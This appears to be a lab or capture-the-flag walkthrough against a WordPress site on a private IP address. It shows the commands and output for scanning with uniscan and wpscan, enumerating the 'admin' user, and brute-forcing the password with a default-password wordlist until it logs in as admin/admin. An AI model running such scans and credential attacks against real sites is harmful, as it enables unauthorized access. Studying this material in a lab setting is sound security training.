# exploit wp-admin

1. browse `http://172.21.208.156/`

```
It works!

This is the default web page for this server.

The web server software is running but no content has been added, yet.
```

2. `$ sudo uniscan -u http://172.21.208.156/ -q -w -e -d -s` 

```
...
===================================================================================================
| Domain: http://172.21.208.156/
| Server: Apache/2.4.18 (Ubuntu)
| IP: 172.21.208.156
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://172.21.208.156/secret/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://172.21.208.156/index.html
===================================================================================================
...
| [+] Crawling finished, 6 URL's found!
|
| External hosts:
| [+] External Host Found: http://vtcsec
| [+] External Host Found: https://wordpress.org
| [+] External Host Found: http://gmpg.org
...
```

3. browse `http://172.21.208.156/secret/`

```
My secret blog / Just another WordPress site

Posted on November 16, 2017
Hello world!

Welcome to WordPress. This is your first post. Edit or delete it, then start writing!

...

Proudly powered by WordPress
```

4. `$ wpscan --url http://172.21.208.156/secret/ --api-token <API_TOKEN>`

```
...
[+] WordPress version 4.9.22 identified (Outdated, released on 2022-10-17).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://172.21.208.156/secret/, Match: '-release.min.js?ver=4.9.22'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://172.21.208.156/secret/, Match: 'WordPress 4.9.22'
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
...
```

5. `$ wpscan --url http://172.21.208.156/secret/ --enumerate u`

```
...
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

6. `$ wpscan --url http://172.21.208.156/secret/ --usernames admin --passwords /usr/share/wordlists/metasploit/http_default_pass.txt`

```
...
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / admin                                                                                                                                                                                    
...
[!] Valid Combinations Found:
 | Username: admin, Password: admin
...
```

7. browse `http://172.21.208.156/secret/wp-login.php`, use `admin/admin`

```
Dashboard (admin)

Welcome to WordPress!
```
